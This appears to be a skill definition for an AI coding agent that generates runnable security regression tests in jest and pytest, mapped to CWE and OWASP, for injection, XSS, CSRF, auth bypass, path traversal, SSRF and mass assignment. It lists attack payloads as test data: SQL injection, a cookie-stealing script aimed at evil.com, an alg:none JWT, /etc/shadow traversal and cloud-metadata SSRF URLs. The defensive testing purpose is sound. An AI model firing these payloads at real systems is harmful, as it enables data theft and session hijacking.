---
name: security-test-generator
description: "Trigger: security tests, vulnerability regression suite, pentest-style tests, injection/XSS/auth test code. Generates runnable security tests."
when_to_use: "generar tests de seguridad, tests de vulnerabilidades, suite de seguridad, tests de inyección"
---

# Security Test Generator

This skill generates executable security test suites targeting common web application vulnerabilities. Unlike scanning skills that report findings, this skill outputs runnable test code in jest+supertest (JavaScript/TypeScript) or pytest+requests (Python) that actively probes endpoints for SQL injection, XSS, CSRF, authentication bypass, path traversal, SSRF, and mass assignment vulnerabilities — mapping each test case to CWE and OWASP Top 10:2021 standards.

## When to Use

- When the user asks to "generate security tests" or "create a security test suite"
- When the user wants "vulnerability tests", "pentest tests", or "security regression tests"
- When the user asks to "write tests for OWASP Top 10" or "test for SQL injection"
- When the user wants automated security tests for an Express, Fastify, Koa, Flask, Django, or FastAPI application
- When a pull request adds new API endpoints and the user wants security test coverage
- When the user asks to "test my API for security issues" or "generate exploit tests"

## When NOT to Use

**DO NOT activate if the request is not about producing runnable security test code, even if the word "security" appears.** The presence of security keywords alone is not a trigger — the request must be about writing executable test cases that probe a web application or API for vulnerabilities.

- When the user wants a static analysis scan — **Decline** and recommend `bandit-sast` or `security-review`
- When the user wants a cryptographic audit — **Decline** and recommend `crypto-audit`
- When the user is asking about security concepts without wanting test code generated — **Decline** and answer the conceptual question directly without generating test files
- When the project has no web endpoints or API routes to test — **Decline** and explain that this skill targets HTTP request/response flows
- When the user wants a **CI/CD pipeline** — you **MUST** decline and recommend `devsecops-pipeline`
- When the user wants a **security scan or vulnerability report** (not test code) — you **MUST** decline and recommend `bandit-sast`, `security-review`, or the appropriate scanning skill

## Prerequisites

### Tool Installed (Preferred)

No external tool required. This skill generates test code using code analysis only.

All test generation is performed through code inspection and template synthesis — no CLI tool needs to be installed, configured, or invoked. The generated tests use standard testing frameworks (jest+supertest or pytest+requests) that the user installs in their own project.

### Tool Not Installed (Fallback)

This skill is always available as a pure code-generation skill. There is no fallback mode because there is no external tool dependency. The skill analyzes code and produces runnable test files directly.

## Framework Detection

Before generating tests, detect the project language and framework:

1. **JavaScript/TypeScript (jest + supertest)**
   - Detect: `package.json` exists AND contains `express`, `fastify`, `koa`, or `hapi` in dependencies or devDependencies
   - Test runner: jest with supertest
   - Output: `__tests__/security/<endpoint>.security.test.js` or `.test.ts`

2. **Python (pytest + requests)**
   - Detect: `setup.py`, `pyproject.toml`, or `requirements.txt` exists AND contains `flask`, `django`, `fastapi`, or `starlette`
   - Test runner: pytest with requests
   - Output: `tests/security/test_<endpoint>_security.py`

3. **Framework-agnostic (bash + curl)**
   - Detect: No recognized framework found
   - Output: `tests/security/security_tests.sh` — a bash script using curl with malicious payloads
   - Each test: send curl request, check HTTP status code, grep response for injected content

## Test Anatomy

Every generated security test follows this structure:

1. **Descriptive test name** — includes the vulnerability type and CWE ID (e.g., `"should reject SQL injection in search parameter (CWE-89)"`)
2. **Arrange** — set up the malicious payload
3. **Act** — send the request to the target endpoint with the payload
4. **Assert** — verify the application rejects the payload:
   - Response status code should be 400, 403, or 422 (NOT 200 or 302)
   - Response body must NOT contain the injected content (no reflected script tags, no SQL error messages, no file contents)
5. **Comment** — link to the relevant CWE and OWASP category

### Jest + Supertest Template Structure

```javascript
const request = require('supertest');
const app = require('../app'); // Adjust path to your Express app

describe('Security Tests - /api/users', () => {
  afterAll(async () => {
    // Close server/database connections if needed
  });

  describe('SQL Injection (CWE-89)', () => {
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE users; --",
      "' UNION SELECT null, username, password FROM users --",
    ];

    payloads.forEach((payload) => {
      it(`should reject SQL injection payload: ${payload} (CWE-89)`, async () => {
        // Arrange
        const maliciousInput = payload;

        // Act
        const response = await request(app)
          .get('/api/users')
          .query({ search: maliciousInput });

        // Assert — app must reject or sanitize, not return 200 with injected data
        expect(response.status).not.toBe(200);
        expect(response.text).not.toContain('DROP TABLE');
        // CWE-89: Improper Neutralization of Special Elements in SQL
        // OWASP A03:2021 - Injection
      });
    });
  });
});
```

### Pytest Template Structure

```python
import pytest
import requests

BASE_URL = "http://localhost:5000"  # Adjust to your Flask/FastAPI app


@pytest.mark.security
class TestSQLInjection:
    """SQL Injection tests — CWE-89, OWASP A03:2021"""

    payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT null, username, password FROM users --",
    ]

    @pytest.mark.parametrize("payload", payloads)
    def test_search_rejects_sql_injection(self, payload):
        """CWE-89: SQL Injection in search parameter — OWASP A03:2021"""
        # Arrange
        params = {"q": payload}

        # Act
        response = requests.get(f"{BASE_URL}/api/search", params=params)

        # Assert — app must reject or sanitize
        assert response.status_code != 200, (
            f"Endpoint returned 200 for SQL injection payload: {payload}"
        )
        assert "DROP TABLE" not in response.text
```

## Vulnerability Checks

### Check 1: SQL Injection (CWE-89)

**CWE-89** (Improper Neutralization of Special Elements used in an SQL Command) | **A03:2021** - Injection | Severity: **Critical**

**WHY:** SQL injection allows attackers to read, modify, or delete arbitrary database data, bypass authentication, and in some cases execute operating system commands. It remains one of the most exploited vulnerability classes — a single unparameterized query can compromise an entire database.

**DETECT:** Scan for string concatenation or interpolation inside SQL query strings:
- JavaScript/TypeScript: `db.query("SELECT ... " + variable)`, template literals in query strings, `.prepare()` or `.execute()` with string interpolation
- Python: `cursor.execute(f"SELECT ... {variable}")`, `cursor.execute("SELECT ... " + variable)`, `cursor.execute("SELECT ... %s" % variable)`

**Malicious Payloads:**

```text
' OR '1'='1
'; DROP TABLE users; --
' UNION SELECT null, username, password FROM users --
1; WAITFOR DELAY '0:0:5' --
' AND 1=CONVERT(int, (SELECT TOP 1 password FROM users)) --
```

**Generated Test — Jest + Supertest:**

```javascript
describe('SQL Injection (CWE-89)', () => {
  const sqlPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, username, password FROM users --",
  ];

  sqlPayloads.forEach((payload) => {
    it(`should reject SQL injection in search: ${payload} (CWE-89)`, async () => {
      const response = await request(app)
        .get('/api/users')
        .query({ search: payload });

      expect(response.status).not.toBe(200);
      expect(response.text).not.toMatch(/syntax error|SQL|mysql|sqlite/i);
      // CWE-89 | OWASP A03:2021 - Injection
    });
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
@pytest.mark.parametrize("payload", [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT null, username, password FROM users --",
])
def test_sql_injection_search(payload):
    """CWE-89: SQL Injection via search parameter — OWASP A03:2021"""
    response = requests.get(f"{BASE_URL}/api/search", params={"q": payload})
    assert response.status_code != 200, f"SQLi payload accepted: {payload}"
    assert "syntax error" not in response.text.lower()
    assert "sql" not in response.text.lower()
```

---

### Check 2: Cross-Site Scripting — XSS (CWE-79)

**CWE-79** (Improper Neutralization of Input During Web Page Generation) | **A03:2021** - Injection | Severity: **High**

**WHY:** XSS allows attackers to inject client-side scripts into web pages viewed by other users, enabling session hijacking, credential theft, defacement, and phishing. Reflected XSS exploits occur when user input is echoed back in HTML responses without escaping.

**DETECT:** Scan for user input directly concatenated or interpolated into HTML response strings:
- JavaScript/TypeScript: `res.send("<h1>" + req.query.name)`, template literals with `${req.body.field}` in HTML strings, `innerHTML` assignments
- Python: `return f"<h1>{request.args.get('name')}</h1>"`, `make_response()` with unescaped input, Jinja2 `|safe` filter on user input

**Malicious Payloads:**

```text
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><script>document.location='http://evil.com/steal?c='+document.cookie</script>
<svg onload=alert(1)>
javascript:alert(1)
```

**Generated Test — Jest + Supertest:**

```javascript
describe('Cross-Site Scripting (CWE-79)', () => {
  const xssPayloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>document.location="http://evil.com"</script>',
  ];

  xssPayloads.forEach((payload) => {
    it(`should reject XSS payload: ${payload} (CWE-79)`, async () => {
      const response = await request(app)
        .get('/api/profile')
        .query({ name: payload });

      expect(response.text).not.toContain('<script>');
      expect(response.text).not.toContain('onerror=');
      // CWE-79 | OWASP A03:2021 - Injection
    });
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>document.location="http://evil.com"</script>',
])
def test_xss_profile(payload):
    """CWE-79: Reflected XSS in profile endpoint — OWASP A03:2021"""
    response = requests.get(f"{BASE_URL}/api/profile", params={"name": payload})
    assert "<script>" not in response.text
    assert "onerror=" not in response.text
```

---

### Check 3: Cross-Site Request Forgery — CSRF (CWE-352)

**CWE-352** (Cross-Site Request Forgery) | **A01:2021** - Broken Access Control | Severity: **High**

**WHY:** CSRF attacks trick authenticated users into submitting unintended requests. An attacker crafts a malicious page that automatically submits a form or XHR to the vulnerable application, inheriting the victim's session cookies. This can trigger fund transfers, password changes, or privilege escalation without the user's knowledge.

**DETECT:** Scan for state-changing endpoints (POST, PUT, DELETE) that do not check for a CSRF token:
- JavaScript/TypeScript: `app.post('/path', handler)` where handler does not check `req.headers['x-csrf-token']` or use a CSRF middleware (e.g., `csurf`)
- Python: `@app.route('/path', methods=['POST'])` without `@csrf.exempt` being intentional or without CSRF middleware (e.g., `flask_wtf.csrf`)

**Malicious Payloads:**

```text
POST request with no CSRF token header
POST request with empty X-CSRF-Token header
POST request with forged/invalid CSRF token
POST request from cross-origin (Origin: http://evil.com)
```

**Generated Test — Jest + Supertest:**

```javascript
describe('CSRF Protection (CWE-352)', () => {
  it('should reject POST without CSRF token (CWE-352)', async () => {
    const response = await request(app)
      .post('/api/transfer')
      .send({ from: 'user1', to: 'attacker', amount: 1000 });

    expect(response.status).not.toBe(200);
    expect(response.status).not.toBe(302);
    // CWE-352 | OWASP A01:2021 - Broken Access Control
  });

  it('should reject POST with invalid CSRF token (CWE-352)', async () => {
    const response = await request(app)
      .post('/api/transfer')
      .set('X-CSRF-Token', 'invalid-token-value')
      .send({ from: 'user1', to: 'attacker', amount: 1000 });

    expect(response.status).not.toBe(200);
    // CWE-352 | OWASP A01:2021 - Broken Access Control
  });

  it('should reject cross-origin POST (CWE-352)', async () => {
    const response = await request(app)
      .post('/api/transfer')
      .set('Origin', 'http://evil.com')
      .send({ from: 'user1', to: 'attacker', amount: 1000 });

    expect(response.status).not.toBe(200);
    // CWE-352 | OWASP A01:2021 - Broken Access Control
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
class TestCSRF:
    """CSRF protection tests — CWE-352, OWASP A01:2021"""

    def test_post_without_csrf_token(self):
        """CWE-352: POST without CSRF token should be rejected"""
        response = requests.post(
            f"{BASE_URL}/api/transfer",
            json={"from": "user1", "to": "attacker", "amount": 1000},
        )
        assert response.status_code != 200
        assert response.status_code != 302

    def test_post_with_invalid_csrf_token(self):
        """CWE-352: POST with invalid CSRF token should be rejected"""
        response = requests.post(
            f"{BASE_URL}/api/transfer",
            json={"from": "user1", "to": "attacker", "amount": 1000},
            headers={"X-CSRF-Token": "invalid-token-value"},
        )
        assert response.status_code != 200

    def test_post_from_cross_origin(self):
        """CWE-352: Cross-origin POST should be rejected"""
        response = requests.post(
            f"{BASE_URL}/api/transfer",
            json={"from": "user1", "to": "attacker", "amount": 1000},
            headers={"Origin": "http://evil.com"},
        )
        assert response.status_code != 200
```

---

### Check 4: Authentication Bypass (CWE-287)

**CWE-287** (Improper Authentication) | **A07:2021** - Identification and Authentication Failures | Severity: **Critical**

**WHY:** Endpoints that skip authentication middleware allow any unauthenticated user to access sensitive operations. Attackers discover these unprotected endpoints through forced browsing or API enumeration, gaining access to admin panels, configuration endpoints, or user data without credentials.

**DETECT:** Scan for route handlers on sensitive paths that lack authentication middleware:
- JavaScript/TypeScript: `app.post('/api/admin/*', handler)` or `app.get('/api/users', handler)` where handler is directly defined without an auth middleware parameter (e.g., `app.post('/admin/config', (req, res) => ...)` vs `app.post('/admin/config', authMiddleware, (req, res) => ...)`)
- Python: `@app.route('/admin/*')` without `@login_required` or session/token checks in the handler body

**Malicious Payloads:**

```text
Request to admin endpoint with no Authorization header
Request with empty Bearer token
Request with malformed JWT: eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
Request to sensitive endpoint as unauthenticated user
```

**Generated Test — Jest + Supertest:**

```javascript
describe('Authentication Bypass (CWE-287)', () => {
  it('should require authentication on admin endpoints (CWE-287)', async () => {
    const response = await request(app)
      .post('/api/admin/config')
      .send({ setting: 'debug', value: true });

    expect(response.status).toBe(401);
    // CWE-287 | OWASP A07:2021 - Identification and Authentication Failures
  });

  it('should reject empty Bearer token (CWE-287)', async () => {
    const response = await request(app)
      .post('/api/admin/config')
      .set('Authorization', 'Bearer ')
      .send({ setting: 'debug', value: true });

    expect(response.status).toBe(401);
    // CWE-287 | OWASP A07:2021
  });

  it('should reject malformed JWT with alg:none (CWE-287)', async () => {
    const response = await request(app)
      .post('/api/admin/config')
      .set('Authorization', 'Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.')
      .send({ setting: 'debug', value: true });

    expect(response.status).toBe(401);
    // CWE-287 | OWASP A07:2021
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
class TestAuthenticationBypass:
    """Authentication bypass tests — CWE-287, OWASP A07:2021"""

    def test_admin_endpoint_requires_auth(self):
        """CWE-287: Admin endpoint without auth should return 401"""
        response = requests.post(
            f"{BASE_URL}/api/admin/config",
            json={"setting": "debug", "value": True},
        )
        assert response.status_code == 401

    def test_empty_bearer_token_rejected(self):
        """CWE-287: Empty Bearer token should be rejected"""
        response = requests.post(
            f"{BASE_URL}/api/admin/config",
            json={"setting": "debug", "value": True},
            headers={"Authorization": "Bearer "},
        )
        assert response.status_code == 401

    def test_alg_none_jwt_rejected(self):
        """CWE-287: JWT with alg:none should be rejected"""
        response = requests.post(
            f"{BASE_URL}/api/admin/config",
            json={"setting": "debug", "value": True},
            headers={"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."},
        )
        assert response.status_code == 401
```

---

### Check 5: Path Traversal (CWE-22)

**CWE-22** (Improper Limitation of a Pathname to a Restricted Directory) | **A01:2021** - Broken Access Control | Severity: **High**

**WHY:** Path traversal allows attackers to read arbitrary files on the server by manipulating file path parameters with `../` sequences. This can expose source code, configuration files, `/etc/passwd`, environment variables, and cryptographic keys — often leading to full system compromise.

**DETECT:** Scan for user input used directly in file system operations:
- JavaScript/TypeScript: `fs.readFileSync(path.join(basePath, req.query.name))`, `fs.readFile(req.params.file)`, any `fs.*` call with request parameters
- Python: `open(os.path.join(base, request.args.get('file')))`, `pathlib.Path(user_input)`, `send_file(request.args.get('path'))`

**Malicious Payloads:**

```text
../../etc/passwd
..%2F..%2Fetc%2Fpasswd
....//....//etc/passwd
/etc/shadow
..\/..\/..\/etc/passwd
```

**Generated Test — Jest + Supertest:**

```javascript
describe('Path Traversal (CWE-22)', () => {
  const traversalPayloads = [
    '../../etc/passwd',
    '..%2F..%2Fetc%2Fpasswd',
    '....//....//etc/passwd',
  ];

  traversalPayloads.forEach((payload) => {
    it(`should reject path traversal: ${payload} (CWE-22)`, async () => {
      const response = await request(app)
        .get('/api/files')
        .query({ name: payload });

      expect(response.status).not.toBe(200);
      expect(response.text).not.toContain('root:');
      // CWE-22 | OWASP A01:2021 - Broken Access Control
    });
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
@pytest.mark.parametrize("payload", [
    "../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
])
def test_path_traversal_files(payload):
    """CWE-22: Path traversal in file download — OWASP A01:2021"""
    response = requests.get(f"{BASE_URL}/api/files", params={"name": payload})
    assert response.status_code != 200, f"Path traversal payload accepted: {payload}"
    assert "root:" not in response.text
```

---

### Check 6: Server-Side Request Forgery — SSRF (CWE-918)

**CWE-918** (Server-Side Request Forgery) | **A10:2021** - Server-Side Request Forgery | Severity: **High**

**WHY:** SSRF allows attackers to make the server issue HTTP requests to arbitrary destinations — including internal services, cloud metadata endpoints (169.254.169.254), and localhost admin panels that are not exposed to the internet. This can leak cloud credentials (AWS IAM role tokens), access internal APIs, and pivot into internal networks.

**DETECT:** Scan for user-controlled URLs passed to HTTP client functions:
- JavaScript/TypeScript: `fetch(req.body.url)`, `axios.get(req.query.url)`, `http.get(userUrl)`, `got(req.body.target)`
- Python: `requests.get(request.json['url'])`, `urllib.request.urlopen(user_url)`, `httpx.get(request.args.get('url'))`

**Malicious Payloads:**

```text
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://localhost:6379/
http://127.0.0.1:3000/api/admin
http://[::1]:8080/
file:///etc/passwd
```

**Generated Test — Jest + Supertest:**

```javascript
describe('SSRF (CWE-918)', () => {
  const ssrfPayloads = [
    'http://169.254.169.254/latest/meta-data/',
    'http://localhost:6379/',
    'http://127.0.0.1:3000/api/admin',
  ];

  ssrfPayloads.forEach((payload) => {
    it(`should block SSRF to internal URL: ${payload} (CWE-918)`, async () => {
      const response = await request(app)
        .post('/api/fetch')
        .send({ url: payload });

      expect(response.status).not.toBe(200);
      // CWE-918 | OWASP A10:2021 - Server-Side Request Forgery
    });
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
@pytest.mark.parametrize("payload", [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:6379/",
    "http://127.0.0.1:3000/api/admin",
])
def test_ssrf_fetch_endpoint(payload):
    """CWE-918: SSRF via user-controlled URL — OWASP A10:2021"""
    response = requests.post(
        f"{BASE_URL}/api/fetch",
        json={"url": payload},
    )
    assert response.status_code != 200, f"SSRF payload accepted: {payload}"
```

---

### Check 7: Mass Assignment (CWE-915)

**CWE-915** (Improperly Controlled Modification of Dynamically-Determined Object Attributes) | **A04:2021** - Insecure Design | Severity: **High**

**WHY:** Mass assignment occurs when an application blindly assigns all user-supplied fields to a database model without allowlisting. An attacker can add unexpected fields like `is_admin: true`, `role: "superuser"`, or `price: 0` to escalate privileges, bypass payment, or modify protected attributes.

**DETECT:** Scan for request body spread directly into ORM/model operations:
- JavaScript/TypeScript: `Model.create(req.body)`, `user.update(req.body)`, `Object.assign(model, req.body)`, spread operator: `{ ...req.body }` into database calls
- Python: `User.objects.create(**request.json)`, `user.update(**request.json)`, `db.session.merge(User(**request.json))`, `setattr(model, key, value)` in a loop over request data

**Malicious Payloads:**

```text
{"username": "normal", "is_admin": true}
{"name": "user", "role": "superuser", "verified": true}
{"item": "product", "price": 0, "discount": 100}
```

**Generated Test — Jest + Supertest:**

```javascript
describe('Mass Assignment (CWE-915)', () => {
  it('should not allow setting is_admin via request body (CWE-915)', async () => {
    const response = await request(app)
      .put('/api/users/1')
      .send({ username: 'normal', is_admin: true });

    expect(response.status).not.toBe(200);
    // If 200 is returned, verify the protected field was not modified:
    if (response.status === 200) {
      expect(response.body.is_admin).not.toBe(true);
    }
    // CWE-915 | OWASP A04:2021 - Insecure Design
  });

  it('should not allow setting role via request body (CWE-915)', async () => {
    const response = await request(app)
      .put('/api/users/1')
      .send({ name: 'user', role: 'superuser' });

    if (response.status === 200) {
      expect(response.body.role).not.toBe('superuser');
    }
    // CWE-915 | OWASP A04:2021 - Insecure Design
  });

  it('should not allow modifying price via mass assignment (CWE-915)', async () => {
    const response = await request(app)
      .put('/api/users/1')
      .send({ item: 'product', price: 0, discount: 100 });

    if (response.status === 200) {
      expect(response.body.price).not.toBe(0);
    }
    // CWE-915 | OWASP A04:2021 - Insecure Design
  });
});
```

**Generated Test — Pytest:**

```python
@pytest.mark.security
class TestMassAssignment:
    """Mass assignment tests — CWE-915, OWASP A04:2021"""

    def test_cannot_set_admin_flag(self):
        """CWE-915: Should not allow setting is_admin via request body"""
        response = requests.put(
            f"{BASE_URL}/api/users/1",
            json={"username": "normal", "is_admin": True},
        )
        if response.status_code == 200:
            data = response.json()
            assert data.get("is_admin") is not True, "Mass assignment allowed is_admin"

    def test_cannot_set_role(self):
        """CWE-915: Should not allow setting role via request body"""
        response = requests.put(
            f"{BASE_URL}/api/users/1",
            json={"name": "user", "role": "superuser"},
        )
        if response.status_code == 200:
            data = response.json()
            assert data.get("role") != "superuser", "Mass assignment allowed role escalation"

    def test_cannot_modify_price(self):
        """CWE-915: Should not allow modifying protected price field"""
        response = requests.put(
            f"{BASE_URL}/api/users/1",
            json={"item": "product", "price": 0, "discount": 100},
        )
        if response.status_code == 200:
            data = response.json()
            assert data.get("price") != 0, "Mass assignment allowed price manipulation"
```

---

## Workflow

1. **Detect project language and framework** — Inspect `package.json`, `requirements.txt`, `setup.py`, `pyproject.toml`, `go.mod`, or similar manifest files. Determine the primary web framework in use (Express, Fastify, Koa, Flask, Django, FastAPI, etc.).
2. **Select test framework** — Based on the detected language:
   - JavaScript/TypeScript → jest + supertest
   - Python → pytest + requests
   - Other/unknown → bash + curl
3. **Identify routes and endpoints** — Scan source files for route definitions:
   - Express: `app.get(`, `app.post(`, `app.put(`, `app.delete(`, `router.get(`, `router.post(`
   - Flask: `@app.route(`, `@blueprint.route(`
   - FastAPI: `@app.get(`, `@app.post(`, `@router.get(`
   - Django: `path(`, `re_path(` in `urls.py`
4. **Analyze each endpoint handler** — For each discovered route, inspect the handler body to determine which vulnerability types apply:
   - String concatenation in SQL queries → SQL Injection tests
   - User input reflected in HTML → XSS tests
   - State-changing POST/PUT without CSRF middleware → CSRF tests
   - No authentication middleware on sensitive routes → Auth Bypass tests
   - User input in file system operations → Path Traversal tests
   - User-controlled URLs in HTTP client calls → SSRF tests
   - Request body spread into model/ORM updates → Mass Assignment tests
5. **Generate test file(s)** — Create one test file per endpoint (or one consolidated file for small apps) using the appropriate template:
   - Include a `describe` block (jest) or test class (pytest) per endpoint
   - Include nested `describe`/test blocks per vulnerability type
   - Include at least 3 malicious payloads per vulnerability type
   - Include CWE and OWASP comments on every test
6. **Output instructions** — Tell the user:
   - The file path where the test was written
   - How to install test dependencies: `npm install --save-dev jest supertest` or `pip install pytest requests`
   - How to run: `npx jest __tests__/security/` or `pytest tests/security/ -m security`
   - Remind them that failing tests indicate the app is VULNERABLE (the expected secure behavior is to reject malicious payloads)

## Findings Format

For this skill, the "findings" are generated test cases rather than discovered vulnerabilities. Each row represents a test case that was generated:

| Field | Description |
|-------|-------------|
| Severity | Critical / High / Medium / Low — based on vulnerability type |
| CWE | CWE-XXX identifier for the vulnerability being tested |
| OWASP | A01-A10 category (OWASP Top 10:2021) |
| Target Endpoint | The route/endpoint the test targets |
| Vulnerability | The vulnerability type being tested |
| Test File | Path to the generated test file |

### Example Finding

| Field | Value |
|-------|-------|
| Severity | Critical |
| CWE | CWE-89 |
| OWASP | A03:2021 - Injection |
| Target Endpoint | GET /api/users?search= |
| Vulnerability | SQL Injection — string concatenation in query |
| Test File | __tests__/security/users.security.test.js |

## Reference Tables

### Vulnerability Type to CWE/OWASP Mapping

| # | Vulnerability Type | CWE | OWASP | Default Severity |
|---|-------------------|-----|-------|------------------|
| 1 | SQL Injection | CWE-89 | A03:2021 - Injection | Critical |
| 2 | Cross-Site Scripting (XSS) | CWE-79 | A03:2021 - Injection | High |
| 3 | Cross-Site Request Forgery (CSRF) | CWE-352 | A01:2021 - Broken Access Control | High |
| 4 | Authentication Bypass | CWE-287 | A07:2021 - Identification and Authentication Failures | Critical |
| 5 | Path Traversal | CWE-22 | A01:2021 - Broken Access Control | High |
| 6 | Server-Side Request Forgery (SSRF) | CWE-918 | A10:2021 - Server-Side Request Forgery | High |
| 7 | Mass Assignment | CWE-915 | A04:2021 - Insecure Design | High |

### CWE Reference

| CWE ID | Name | MITRE URL |
|--------|------|-----------|
| CWE-22 | Improper Limitation of a Pathname to a Restricted Directory | https://cwe.mitre.org/data/definitions/22.html |
| CWE-79 | Improper Neutralization of Input During Web Page Generation | https://cwe.mitre.org/data/definitions/79.html |
| CWE-89 | Improper Neutralization of Special Elements used in an SQL Command | https://cwe.mitre.org/data/definitions/89.html |
| CWE-287 | Improper Authentication | https://cwe.mitre.org/data/definitions/287.html |
| CWE-352 | Cross-Site Request Forgery | https://cwe.mitre.org/data/definitions/352.html |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes | https://cwe.mitre.org/data/definitions/915.html |
| CWE-918 | Server-Side Request Forgery | https://cwe.mitre.org/data/definitions/918.html |

### OWASP Top 10:2021 Quick Reference

| Category | Description | Related Checks |
|----------|-------------|----------------|
| A01:2021 | Broken Access Control | Checks 3, 5 (CSRF, Path Traversal) |
| A03:2021 | Injection | Checks 1, 2 (SQL Injection, XSS) |
| A04:2021 | Insecure Design | Check 7 (Mass Assignment) |
| A07:2021 | Identification and Authentication Failures | Check 4 (Authentication Bypass) |
| A10:2021 | Server-Side Request Forgery | Check 6 (SSRF) |

## Example Usage

### Express.js Application (jest + supertest)

**User prompt:**
> "Generate security tests for this Express app"

**Expected output (abbreviated):**

```text
## Security Test Generator Results

Detected: Express.js application (package.json)
Test framework: jest + supertest
Scanned 3 route files, found 6 endpoints

### Generated Tests (12 test cases across 5 vulnerability types)

| # | Severity | CWE | OWASP | Endpoint | Vulnerability | Test File |
|---|----------|-----|-------|----------|---------------|-----------|
| 1 | Critical | CWE-89 | A03 | GET /api/users?search= | SQL Injection | __tests__/security/users.security.test.js |
| 2 | High | CWE-79 | A03 | GET /api/profile?name= | Reflected XSS | __tests__/security/profile.security.test.js |
| 3 | High | CWE-22 | A01 | GET /api/files?name= | Path Traversal | __tests__/security/files.security.test.js |
| 4 | Critical | CWE-287 | A07 | POST /api/admin/config | Auth Bypass | __tests__/security/admin.security.test.js |
| 5 | High | CWE-352 | A01 | POST /api/transfer | Missing CSRF | __tests__/security/transfer.security.test.js |

### Run Tests

  npm install --save-dev jest supertest
  npx jest __tests__/security/ --verbose

Note: Failing tests indicate the application is VULNERABLE — the expected
secure behavior is to reject malicious payloads with 400/403/422 status codes.
```

### Flask Application (pytest + requests)

**User prompt:**
> "Generate security tests for this Flask API"

**Expected output (abbreviated):**

```text
## Security Test Generator Results

Detected: Flask application (requirements.txt)
Test framework: pytest + requests
Scanned 1 route file, found 4 endpoints

### Generated Tests (9 test cases across 4 vulnerability types)

| # | Severity | CWE | OWASP | Endpoint | Vulnerability | Test File |
|---|----------|-----|-------|----------|---------------|-----------|
| 1 | Critical | CWE-89 | A03 | GET /api/search?q= | SQL Injection | tests/security/test_search_security.py |
| 2 | High | CWE-918 | A10 | POST /api/fetch | SSRF | tests/security/test_fetch_security.py |
| 3 | High | CWE-915 | A04 | PUT /api/users/<id> | Mass Assignment | tests/security/test_users_security.py |
| 4 | High | CWE-79 | A03 | GET /api/profile | Reflected XSS | tests/security/test_profile_security.py |

### Run Tests

  pip install pytest requests
  pytest tests/security/ -m security -v

Note: Failing tests indicate the application is VULNERABLE — the expected
secure behavior is to reject malicious payloads with 400/403/422 status codes.
```
